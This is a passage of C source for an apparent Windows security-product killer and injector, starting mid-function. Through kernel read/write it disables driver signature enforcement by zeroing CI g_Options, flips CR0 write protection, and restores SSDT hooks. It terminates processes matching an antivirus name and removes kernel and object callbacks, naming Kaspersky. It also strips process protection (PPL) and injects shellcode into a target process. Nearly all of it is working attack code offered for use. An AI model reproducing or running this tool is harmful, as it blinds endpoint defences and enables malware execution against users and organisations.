	if (hModule = LoadLibraryExA(ModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES))
	{
		dwSizeofImage = ((PIMAGE_NT_HEADERS32)((PBYTE)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew))->OptionalHeader.SizeOfImage;
		for (i = 0; i < dwSizeofImage - dwPattern; i++)
		{
			if (RtlEqualMemory((PBYTE)hModule + i, pattern, dwPattern))
			{
				for (j = 0; j < moduleInfos->NumberOfModules; j++)
				{
					if (StrStrIA(moduleInfos->Modules[j].FullPathName, ModuleName))
					{
						*funcAddress = UlongToPtr(PtrToUlong(moduleInfos->Modules[j].ImageBase) + i);
						status = TRUE;
						break;
					}
				}
				break;
			}
		}
	}
	return status;
}
BOOL GetFulleDriverPath(PWSTR* fullPath)
{
	wchar_t currentPath[MAX_PATH] = { 0 };
	BOOL status = FALSE;
	SIZE_T len;

	GetCurrentDirectoryW(MAX_PATH, currentPath);
	wsprintfW(currentPath, L"%ws\\DisableWP.sys", currentPath);
	len = (wcslen(currentPath) + 1) * sizeof(wchar_t);
	if (*fullPath = LocalAlloc(LPTR, len))
	{
		RtlCopyMemory(*fullPath, currentPath, len - sizeof(wchar_t));
		status = TRUE;
	}

	return status;
}
BOOL LoadDriver(BOOL Delete)
{
	BOOL status = FALSE;
	SC_HANDLE hSc = NULL, hService = NULL;
	PWSTR DriverFilePath = NULL;
	SERVICE_STATUS_PROCESS  ServiceStatus;
	DWORD dwBytesNeeded;

	hSc = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);

	if (hSc != NULL)
	{
		if (!Delete)
		{
			if (GetFulleDriverPath(&DriverFilePath))
			{
				hService = CreateServiceW(hSc, L"DisableWP", NULL, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, DriverFilePath, NULL, NULL, NULL, NULL, NULL);
				if (hService != NULL)
				{
					if (!StartServiceW(hService, 0, NULL))
						wprintf(L"[-] StartServiceW Failed %d\n", GetLastError());
					else
					{
						if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (PBYTE)&ServiceStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
						{
							while (ServiceStatus.dwCurrentState != SERVICE_RUNNING)
							{
								Sleep(ServiceStatus.dwWaitHint);
								if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (PBYTE)&ServiceStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
									break;
							}
							if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
							{
								status = TRUE;
								wprintf(L"[+] StartService Success\n");
							}
						}
					}
					CloseServiceHandle(hService);
				}
				else wprintf(L"[-] CreateServiceW Failed %d\n", GetLastError());
				LocalFree(DriverFilePath);
			}
		}
		else
		{
			hService = OpenServiceW(hSc, L"DisableWP", SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
			if (hService != NULL)
			{
				ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ServiceStatus);
				if (ServiceStatus.dwCurrentState != SERVICE_STOPPED)
				{
					while (ServiceStatus.dwCurrentState != SERVICE_STOPPED)
					{
						Sleep(ServiceStatus.dwWaitHint);
						if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (PBYTE)&ServiceStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
							break;
						if (ServiceStatus.dwCurrentState == SERVICE_STOPPED)
						{
							wprintf(L"[+] Stop Service Success\n");
							break;
						}
					}
				}
				if (DeleteService(hService))
					wprintf(L"[+] DeleteService Success\n");
				else wprintf(L"[-] DeleteService Failed %d\n", GetLastError());
				CloseServiceHandle(hService);
			}
			else wprintf(L"[-] OpenServiceW Failed %d\n", GetLastError());
		}
		CloseServiceHandle(hSc);
	}
	return status;
}
BOOL Control_CR0(BOOL Write)
{
	HANDLE hDevice = NULL;
	ULONG ControlCode = 0, out = 0;
	DWORD BytesReturned = 0;
	BOOL status = FALSE;

	ControlCode = Write ? IOCTL_WRITE_CR0 : IOCTL_REV_CR0;
	hDevice = CreateFileW(L"\\\\.\\ControlCr0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
	{
		if (DeviceIoControl(hDevice, ControlCode, &out, sizeof(out), &out, sizeof(out), &BytesReturned, NULL))
		{
			wprintf(L"%ws", Write ? L"[*] Write cr0 Success " : L"[*] rev cr0 Success ");
			wprintf(L"%08x\n", out); 
			status = Write ? !(out & 0x10000) : (out & 0x10000);
		}
		CloseHandle(hDevice);
	}
	return status;
}
BOOL DisableWP(PDRIVER_INFO driverInfo)
{
	PVOID g_Options = NULL, KernelAddress;
	DWORD DSECODE;
	BOOL status = FALSE;

	GetGlobalAddress("ci.dll", "CiFreePolicyInfo", "CiValidateFileObject", PTRN_W10_1909_g_Options, sizeof(PTRN_W10_1909_g_Options), -4, &KernelAddress);
	ReadR0Code(driverInfo->hDevice, 4, KernelAddress, &g_Options);
	ReadR0Code(driverInfo->hDevice, 4, g_Options, (PVOID)&DSECODE);
	WriteR0Code(driverInfo->hDevice, 4, g_Options, 0x0);
	if (LoadDriver(FALSE))
	{
		while (TRUE)
		{
			if (Control_CR0(TRUE))
				break;
		}
		status = TRUE;
	}
	WriteR0Code(driverInfo->hDevice, 4, g_Options, DSECODE);

	//wprintf(L"DSECODE %x\n", DSECODE);
	return status;

}
void CheckSSDTHOOK(PDRIVER_INFO driverInfo,PBYTE ServiceTableBase,PSTR funcName,PBYTE pattern,DWORD dwPattern)
{
	DWORD i;
	ULONG Index;
	PVOID KernelAddress = NULL, realKernelAddress = NULL;
	if (GetSSDTIndex(funcName, &Index) && GetKernelFuncAddress(driverInfo->ModuleName, pattern, dwPattern, &realKernelAddress))
	{
		ReadR0Code(driverInfo->hDevice, 4, (PBYTE)ServiceTableBase + Index * sizeof(PVOID), &KernelAddress);
		if (KernelAddress != realKernelAddress)
		{
			if (needSort)
				SortDevice();
			for (i = 0; i < moduleInfos->NumberOfModules; i++)
			{
				if (KernelAddress < moduleInfos->Modules[i].ImageBase)
				{

					wprintf(L"[*] %hs Was SSDT HOOK in %hs,CurrentAddress %p, OriginallyAddress %p, Now try to Disable SSDT Table WriteProtect\n", funcName, strrchr((PSTR)moduleInfos->Modules[i - 1].FullPathName, '\\') + 1, KernelAddress, realKernelAddress);
					if (DisableWP(driverInfo))
					{
						WriteR0Code(driverInfo->hDevice, 4, (PBYTE)ServiceTableBase + Index * sizeof(PVOID), (DWORD)realKernelAddress);
						while (TRUE)
						{
							if (Control_CR0(FALSE))
								break;
						}
					}
					LoadDriver(TRUE);
					break;
				}
			}
		}
	}
}
BOOL GetFileBuffer(PWSTR fileName, PBYTE* buffer, PSIZE_T dwSize)
{
	BOOL status = FALSE;
	HANDLE hFile = NULL;
	DWORD temp;

	hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile && hFile != INVALID_HANDLE_VALUE)
	{
		*dwSize = (SIZE_T)GetFileSize(hFile, NULL);
		if (*buffer = LocalAlloc(LPTR, *dwSize))
		{
			if (ReadFile(hFile, *buffer, *dwSize, &temp, NULL))
				status = TRUE;
		}
		CloseHandle(hFile);
	}
	else wprintf(L"[-] CreateFileW Failed %d\n", GetLastError());
	return status;
}
void EnumProcess(PDRIVER_INFO driverInfo, PWSTR avnaame, PVOID  ServiceTableBase,BOOL inJect, PWSTR codePath)
{
	DWORD cbNeed;
	PVOID buffer, address = NULL, targetEprocess;
	SIZE_T dwSize;
	PSYSTEM_HANDLE_INFORMATION pModuleBuffer = NULL;
	PSYSTEM_PROCESS_INFORMATION  tokenInfo;
	HANDLE hProcess = NULL, hThread;;
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	USHORT PPLCODE = 0;
	if (!inJect)
	{
		CheckSSDTHOOK(driverInfo, ServiceTableBase, "NtTerminateProcess", driverInfo->NtTerminateProcessPattern, driverInfo->dwNtTerminateProcessPattern);
		for (cbNeed = 0x1000; (status == STATUS_INFO_LENGTH_MISMATCH) && (buffer = LocalAlloc(LPTR, cbNeed));)
		{
			status = NtQuerySystemInformation(SystemProcessInformation, buffer, cbNeed, &cbNeed);
			if (!NT_SUCCESS(status))
				LocalFree(buffer);
		}
		if (NT_SUCCESS(status))
		{
			for (tokenInfo = buffer; tokenInfo->NextEntryOffset; tokenInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)tokenInfo + tokenInfo->NextEntryOffset))
			{
				if (tokenInfo->ImageName.Length)
				{
					hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PtrToUlong(tokenInfo->UniqueProcessId));
					if (hProcess && hProcess != INVALID_HANDLE_VALUE)
					{
						if (StrStrIW(tokenInfo->ImageName.Buffer, avnaame) || CheckProcessPath(hProcess, avnaame))
						{
							addTerminatePriv(driverInfo, hProcess, PROCESS_TERMINATE);
							status = NtTerminateProcess(hProcess, 0);
							if (NT_SUCCESS(status))
								wprintf(L"[+] TerminateProcess %ws Success\n", tokenInfo->ImageName.Buffer);
							else wprintf(L"[+] TerminateProcess %ws Failed %08x\n", tokenInfo->ImageName.Buffer, status);
						}
						CloseHandle(hProcess);
						hProcess = NULL;
					}
				}
			}
		}
	}
	else
	{
		deleteCallBack(driverInfo, L"Kaspersky", driverInfo->threadStartaAddress, driverInfo->threadEndAddress, driverInfo->threadPattern, driverInfo->dwthreadPattern, driverInfo->threadcallbackoffset);
		//CheckSSDTHOOK(driverInfo, ServiceTableBase, "NtCreateThread", driverInfo->NtCreatedThreadPattern, driverInfo->dwNtCreatedThreadPattern);
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, _wtoi(avnaame));
		
		if (hProcess != INVALID_HANDLE_VALUE && hProcess)
		{
			if (NT_SUCCESS(GetGlobalHandleTable((PVOID*)&pModuleBuffer)))
			{
				if (GetCurrentProcessEprocessByHandle(hProcess, pModuleBuffer, GetCurrentProcessId(), &targetEprocess))
				{
					ReadR0Code(driverInfo->hDevice, 1, ULongToPtr(PtrToUlong(targetEprocess) + driverInfo->PSPROTECTIONOffset), (PVOID)&PPLCODE);
					WriteR0Code(driverInfo->hDevice, 1, ULongToPtr(PtrToUlong(targetEprocess) + driverInfo->PSPROTECTIONOffset), 0);
					wprintf(L"[+] Target Ps_Protection ");
					switch (PPLCODE >> 4)
					{
					case 0:
						wprintf(L"PsProtectedSignerNone\n");
						break;
					case 1:
						wprintf(L"PsProtectedSignerAuthenticode\n");
						break;
					case 2:
						wprintf(L"PsProtectedSignerCodeGen\n");
						break;
					case 3:
						wprintf(L"PsProtectedSignerAntimalware\n");
						break;
					case 4:
						wprintf(L"PsProtectedSignerLsa\n");
						break;
					case 5:
						wprintf(L"PsProtectedSignerWindows\n");
						break;
					case 6:
						wprintf(L"PsProtectedSignerWinTcb\n");
						break;
					default:
						wprintf(L"UnKnow\n");
						break;
					}
					addTerminatePriv(driverInfo, hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE);
					if (GetFileBuffer(codePath, (PBYTE*)&buffer, &dwSize))
					{
						//decode shellcode
						status = NtAllocateVirtualMemory(hProcess, &address, 0, &dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						if (NT_SUCCESS(status))
						{
							wprintf(L"[+] NtAllocateVirtualMemory Success at %p\n", address);
							status = NtWriteVirtualMemory(hProcess, address, buffer, dwSize, &dwSize);
							if (NT_SUCCESS(status))
							{
								wprintf(L"[+] NtWriteVirtualMemory Success\n");
								status = RtlCreateUserThread(hProcess, NULL, FALSE, 0, NULL, NULL, address, NULL, &hThread, NULL);
								WriteR0Code(driverInfo->hDevice, 1, ULongToPtr(PtrToUlong(targetEprocess) + driverInfo->PSPROTECTIONOffset), PPLCODE);
								if (NT_SUCCESS(status))
								{
									wprintf(L"[+] RtlCreateUserThread Success\n");
								}
								else wprintf(L"[-] RtlCreateUserThread Failed 0x%08x\n", status);
							}
							else wprintf(L"[-] NtWriteVirtualMemory Failed 0x%08x\n", status);
						}
						else wprintf(L"[-] NtAllocateVirtualMemory Failed 0x%08x\n", status);
						LocalFree(buffer);
					}
				}
				LocalFree(pModuleBuffer);
			}
			CloseHandle(hProcess);
		}
	}
}

void killprocess(PDRIVER_INFO driverInfo,PWSTR avnaame,PWSTR codePath, BOOL isInject)
{
	NTSTATUS status;
	DWORD currentPID;
	HANDLE hCurrent = NULL;
	ULONG pre;
	PSYSTEM_HANDLE_INFORMATION buffer = NULL;
	PVOID CurrentEprocess = NULL;
	PVOID KeServiceDescriptorTable = NULL, patternAddress = NULL, ServiceTableBase = NULL;

	status = enumDriver();
	if (NT_SUCCESS(status))
	{
		if (GetGlobalAddress(driverInfo->ModuleName, driverInfo->KeServiceDescriptorTableSartAddress, driverInfo->KeServiceDescriptorTableEndAddress, driverInfo->KeServiceDescriptorTablePattern, driverInfo->dwKeServiceDescriptorTablePattern, driverInfo->KeServiceDescriptorTableOffset, &patternAddress))
		{
			if (ReadR0Code(driverInfo->hDevice, 4, patternAddress, &KeServiceDescriptorTable))
			{
				if (ReadR0Code(driverInfo->hDevice, 4, KeServiceDescriptorTable, &ServiceTableBase))
				{
					if (enumDisk())
					{
						RtlAdjustPrivilege(20, TRUE, FALSE, &pre);
						currentPID = GetCurrentProcessId();
						hCurrent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, currentPID);
						if (hCurrent && hCurrent != INVALID_HANDLE_VALUE)
						{
							if (NT_SUCCESS(status = GetGlobalHandleTable((PVOID*)&buffer)))
							{
								if (GetCurrentProcessEprocessByHandle(hCurrent, buffer, currentPID, &CurrentEprocess))
								{
									wprintf(L"[*] Find Current Process Eprocess Address at %p\n", CurrentEprocess);
									if (ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(CurrentEprocess) + driverInfo->ObjectTableOffset), &objectTable))
									{
										EnumProcess(driverInfo, avnaame, ServiceTableBase, isInject, codePath);
									}
								}
								else wprintf(L"[*] Can not find current Process Eprocess Adderss\n");
								LocalFree(buffer);
							}
							else wprintf(L"[*] NtQuerySystemInformation Failed 0x%08x\n", status);
						}
						LocalFree(disk);
					}
				}
			}
		}
		LocalFree(moduleInfos);
	}
}
/*void hidenprocess(PDRIVER_INFO driverInfo, DWORD pid)
{
	HANDLE hProcess = NULL;
	PSYSTEM_HANDLE_INFORMATION pModuleBuffer = NULL;
	PVOID EprocessAddress = NULL;
	PVOID PreListAddress = NULL, PostListAddress = NULL;
	hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (hProcess != INVALID_HANDLE_VALUE && hProcess)
	{

		if (NT_SUCCESS(GetGlobalHandleTable((PVOID*)&pModuleBuffer)))
		{
			if (GetCurrentProcessEprocessByHandle(hProcess, pModuleBuffer, GetCurrentProcessId(), &EprocessAddress))
			{
				wprintf(L"[+] Target Process Eprocess Address at %p\n", EprocessAddress);
				ReadR0Code(driverInfo->hDevice, 4, ULongToPtr(PtrToUlong(EprocessAddress) + driverInfo->ActiveProcessLinksOffset), &PreListAddress);
				ReadR0Code(driverInfo->hDevice, 4, ULongToPtr(PtrToUlong(EprocessAddress) + driverInfo->ActiveProcessLinksOffset + sizeof(PVOID)), &PostListAddress);
				WriteR0Code(driverInfo->hDevice, 4, ULongToPtr(PtrToUlong(PreListAddress) + sizeof(PVOID)), PtrToUlong(PostListAddress));
				WriteR0Code(driverInfo->hDevice, 4, ULongToPtr(PtrToUlong(PostListAddress)), PtrToUlong(PreListAddress));
			}
			LocalFree(pModuleBuffer);
		}
		CloseHandle(hProcess);
	}

}*/
void CheckDriver(PDRIVER_INFO driverInfo, PVOID TypeAddress, PWSTR checName, PVOID funcAddress)
{
	DWORD i = 0, VerinfoSize = 0;
	PWSTR DriverPath = NULL, subBlock = NULL;
	PVOID pBuf = NULL;
	PDWORD pTransTable = NULL;
	UINT cbTranslate;
	PWSTR pVsInfo;

	for (i = 0; i < moduleInfos->NumberOfModules; i++)
	{
		if (funcAddress < moduleInfos->Modules[i].ImageBase)
		{
			if (GetPhyPath(moduleInfos->Modules[i - 1].FullPathName, &DriverPath))
			{
				if (VerinfoSize = GetFileVersionInfoSizeW(DriverPath, 0))
				{
					if ((pBuf = LocalAlloc(LPTR, VerinfoSize + 1)) && (subBlock = LocalAlloc(LPTR, 128)))
					{
						if (GetFileVersionInfoW(DriverPath, 0, VerinfoSize, pBuf))
						{
							if (VerQueryValueW(pBuf, L"\\VarFileInfo\\Translation", (LPVOID*)&pTransTable, &cbTranslate))
							{
								i = 0;
								while (i < cbTranslate / sizeof(DWORD))
								{
									wsprintfW(subBlock, L"\\StringFileInfo\\%04x%04x\\LegalCopyright", LOWORD(*(&pTransTable[i])), HIWORD(*(&pTransTable[i])));
									if (VerQueryValueW(pBuf, subBlock, (LPVOID*)&pVsInfo, &cbTranslate))
									{
										if (StrStrIW(pVsInfo, checName))
										{
											WriteR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(TypeAddress) + driverInfo->ObProcessTypeCallbackListoffset), (DWORD)TypeAddress+ driverInfo->ObProcessTypeCallbackListoffset);
											WriteR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(TypeAddress) + driverInfo->ObProcessTypeCallbackListoffset + sizeof(PVOID)), (DWORD)TypeAddress + driverInfo->ObProcessTypeCallbackListoffset);
											wprintf(L"[*] delete obcallback process type at %p success\n", TypeAddress);
										}
									}
									else break;
									i++;
								}

							}
							else AUTO_ERROR(L"VerQueryValue");
						}
						else AUTO_ERROR(L"GetFileVersionInfoW");
						LocalFree(pBuf);
						LocalFree(subBlock);
					}
				}
				else AUTO_ERROR(L"GetFileVersionInfoSizeW");
				LocalFree(DriverPath);
			}
			break;
		}
	}
}
void EnumObCallBack(PDRIVER_INFO driverInfo, PVOID TypeAddress,PWSTR checName)
{
	PVOID CallbackListAddress = NULL;
	PVOID PostAddress = NULL, PreAddress = NULL;
	PVOID PostFuncAddress = NULL, PreFuncAddress = NULL;
	DWORD i = 0;

	ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(TypeAddress) + driverInfo->ObProcessTypeCallbackListoffset), &CallbackListAddress);
	ReadR0Code(driverInfo->hDevice, 4, CallbackListAddress, &PostAddress);
	while (TRUE)
	{
	
		ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(CallbackListAddress) + 0x18), &PostFuncAddress);
		ReadR0Code(driverInfo->hDevice, 4, UlongToPtr(PtrToUlong(CallbackListAddress) + 0x1c), &PreFuncAddress);
		wprintf(L"[*] PostFuncAddress %p\n", PostFuncAddress);
		wprintf(L"[*] PreFuncAddress %p\n", PreFuncAddress);
		CheckDriver(driverInfo, TypeAddress, checName, PostFuncAddress);

		ReadR0Code(driverInfo->hDevice, 4, PostAddress, &PostAddress);
		
		if ((CallbackListAddress == PostAddress) || ((DWORD)TypeAddress == (DWORD)PostAddress - driverInfo->ObProcessTypeCallbackListoffset))
			break;
	}
}
void deleteobprocesscallback(PDRIVER_INFO driverInfo, PWSTR avnaame)
{
	NTSTATUS status;
	PVOID patternAddress = NULL, PsProcessTypeAddress = NULL, PsProcessTypeStructAddress = NULL;
	PVOID postTypeAddress = NULL;
	status = enumDriver();
	if (NT_SUCCESS(status))
	{
	
		if (needSort)
			SortDevice();
		if (GetGlobalAddress(driverInfo->ModuleName, driverInfo->ObProcessStartAddress, driverInfo->ObProcessEndAddress, driverInfo->ObProcessPattern, driverInfo->dwObProcessPattern, driverInfo->ObOffset, &patternAddress))
		{
			ReadR0Code(driverInfo->hDevice, 4, patternAddress, &PsProcessTypeAddress);
			ReadR0Code(driverInfo->hDevice, 4, PsProcessTypeAddress, &PsProcessTypeStructAddress);
			wprintf(L"[*] PsProcess Address: %p\n", PsProcessTypeStructAddress);
			ReadR0Code(driverInfo->hDevice, 4, PsProcessTypeStructAddress, &postTypeAddress);
			while (TRUE)
			{

				EnumObCallBack(driverInfo, postTypeAddress, avnaame);
				ReadR0Code(driverInfo->hDevice, 4, postTypeAddress, &postTypeAddress);
				if (PsProcessTypeStructAddress == postTypeAddress)
					break;
			}
			
		}
		LocalFree(moduleInfos);
	}
}
int wmain(int argc, wchar_t** argv)
{
	DWORD major, minor, build;
	DRIVER_INFO driverInfo;

	RtlSecureZeroMemory(&driverInfo, sizeof(DRIVER_INFO));
	RtlGetNtVersionNumbers(&major, &minor, &build);
	build &= 0x7ffff;

	if (InitDriverInfo(build, &driverInfo))
	{
		if (!_wcsicmp(argv[1], L"--deletecallback"))
			deleteCallBack(&driverInfo, argv[2], driverInfo.processStartaAddress, driverInfo.processEndAddress, driverInfo.processPattern, driverInfo.dwProcessPattern, driverInfo.processcallbackoffset);
		else if (!_wcsicmp(argv[1], L"--killprocess"))
			killprocess(&driverInfo, argv[2], NULL, FALSE);
		else if (!_wcsicmp(argv[1], L"--inject"))
			killprocess(&driverInfo, argv[2], argv[3], TRUE);
		/*else if (!_wcsicmp(argv[1], L"--hidenprocess"))
			hidenprocess(&driverInfo, _wtoi(argv[2]));*/
		else if (!_wcsicmp(argv[1], L"--deleteobprocess"))
			deleteobprocesscallback(&driverInfo, argv[2]);
		CloseHandle(driverInfo.hDevice);
	}
}